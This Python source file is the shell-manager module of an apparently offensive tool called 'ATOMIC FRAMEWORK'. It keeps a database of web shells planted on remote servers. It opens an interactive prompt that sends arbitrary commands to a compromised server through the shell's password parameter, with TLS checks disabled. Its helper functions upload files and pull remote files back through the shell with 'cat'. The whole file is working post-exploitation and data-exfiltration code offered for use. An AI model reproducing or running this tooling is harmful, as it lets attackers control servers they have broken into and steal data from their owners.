#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Shell Manager Module
Interactive shell management
"""

import os
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from config import Colors
from utils.database import Database


class ShellManager:
    """Interactive Shell Manager"""
    
    def __init__(self):
        self.db = Database()
        self.shells = {}
    
    def list_shells(self):
        """List all active shells"""
        shells = self.db.get_shells()
        
        if not shells:
            print(f"{Colors.warning('No active shells found')}")
            return
        
        print(f"\n{Colors.BOLD}{'='*80}{Colors.RESET}")
        print(f"{Colors.CYAN}{'ID':<15} {'URL':<45} {'Type':<10} {'Created':<15}{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*80}{Colors.RESET}")
        
        for shell in shells:
            shell_id = shell['shell_id'][:14]
            url = shell['url'][:43] if len(shell['url']) > 43 else shell['url']
            shell_type = shell['shell_type']
            created = shell['created_at'].strftime('%Y-%m-%d %H:%M') if shell['created_at'] else 'N/A'
            
            print(f"{shell_id:<15} {url:<45} {shell_type:<10} {created:<15}")
            
            self.shells[shell['shell_id']] = shell
    
    def interactive_shell(self, shell_id: str):
        """Start interactive shell session"""
        shells = self.db.get_shells()
        
        shell = None
        for s in shells:
            if s['shell_id'] == shell_id or s['shell_id'].startswith(shell_id):
                shell = s
                break
        
        if not shell:
            print(f"{Colors.error(f'Shell not found: {shell_id}')}")
            return
        
        print(f"\n{Colors.success(f'Connected to {shell["url"]}')}")
        print(f"{Colors.info('Type "exit" to quit, "help" for commands')}\n")
        
        while True:
            try:
                cmd = input(f"{Colors.GREEN}[shell]{Colors.RESET} $ ")
                
                if cmd.lower() in ['exit', 'quit']:
                    break
                
                if cmd.lower() == 'help':
                    self._print_shell_help()
                    continue
                
                if cmd.lower() == 'info':
                    self._print_shell_info(shell)
                    continue
                
                if cmd.startswith('upload '):
                    self._upload_file(shell, cmd[7:])
                    continue
                
                if cmd.startswith('download '):
                    self._download_file(shell, cmd[9:])
                    continue
                
                # Execute command
                result = self.execute_command(shell['shell_id'], cmd, shell)
                if result:
                    print(result)
                    
            except KeyboardInterrupt:
                print("\n")
                break
            except Exception as e:
                print(f"{Colors.error(f'Error: {e}')}")
    
    def execute_command(self, shell_id: str, cmd: str, shell=None) -> str:
        """Execute command on shell"""
        if not shell:
            shells = self.db.get_shells()
            for s in shells:
                if s['shell_id'] == shell_id or s['shell_id'].startswith(shell_id):
                    shell = s
                    break
        
        if not shell:
            return f"{Colors.error('Shell not found')}"
        
        try:
            import requests
            
            url = shell['url']
            password_param = shell.get('password', 'cmd')
            
            # Build request
            if '?' in url:
                full_url = f"{url}&{password_param}={requests.utils.quote(cmd)}"
            else:
                full_url = f"{url}?{password_param}={requests.utils.quote(cmd)}"
            
            response = requests.get(full_url, timeout=30, verify=False)
            
            # Update last used
            from datetime import datetime
            self.db.update_shell(shell_id, last_used=datetime.utcnow())
            
            return response.text
            
        except Exception as e:
            return f"{Colors.error(f'Command execution failed: {e}')}"
    
    def _print_shell_help(self):
        """Print shell help"""
        help_text = f"""
{Colors.BOLD}Available Commands:{Colors.RESET}
  {Colors.CYAN}help{Colors.RESET}              Show this help
  {Colors.CYAN}info{Colors.RESET}              Show shell information
  {Colors.CYAN}exit/quit{Colors.RESET}         Exit shell session
  {Colors.CYAN}upload <file>{Colors.RESET}     Upload file to server
  {Colors.CYAN}download <file>{Colors.RESET}   Download file from server
  
{Colors.BOLD}Any other command will be executed on the remote server.{Colors.RESET}
"""
        print(help_text)
    
    def _print_shell_info(self, shell: dict):
        """Print shell information"""
        print(f"\n{Colors.BOLD}Shell Information:{Colors.RESET}")
        print(f"  ID:       {shell['shell_id']}")
        print(f"  URL:      {shell['url']}")
        print(f"  Type:     {shell['shell_type']}")
        print(f"  Password: {shell.get('password', 'N/A')}")
        print(f"  Created:  {shell['created_at']}")
        print(f"  Last Use: {shell.get('last_used', 'Never')}")
        print()
    
    def _upload_file(self, shell: dict, local_path: str):
        """Upload file via shell"""
        if not os.path.exists(local_path):
            print(f"{Colors.error(f'File not found: {local_path}')}")
            return
        
        try:
            import requests
            
            url = shell['url']
            filename = os.path.basename(local_path)
            
            # Read file content
            with open(local_path, 'rb') as f:
                content = f.read()
            
            # Try to upload via PHP file upload
            files = {'file': (filename, content)}
            response = requests.post(url, files=files, timeout=30, verify=False)
            
            print(f"{Colors.success(f'File uploaded: {filename}')}")
            
        except Exception as e:
            print(f"{Colors.error(f'Upload failed: {e}')}")
    
    def _download_file(self, shell: dict, remote_path: str):
        """Download file via shell"""
        try:
            # Use shell to read file
            cmd = f"cat {remote_path}"
            result = self.execute_command(shell['shell_id'], cmd, shell)
            
            # Save to local file
            filename = os.path.basename(remote_path)
            local_path = os.path.join(Config.REPORTS_DIR, filename)
            
            with open(local_path, 'w') as f:
                f.write(result)
            
            print(f"{Colors.success(f'File downloaded: {local_path}')}")
            
        except Exception as e:
            print(f"{Colors.error(f'Download failed: {e}')}")


from config import Config
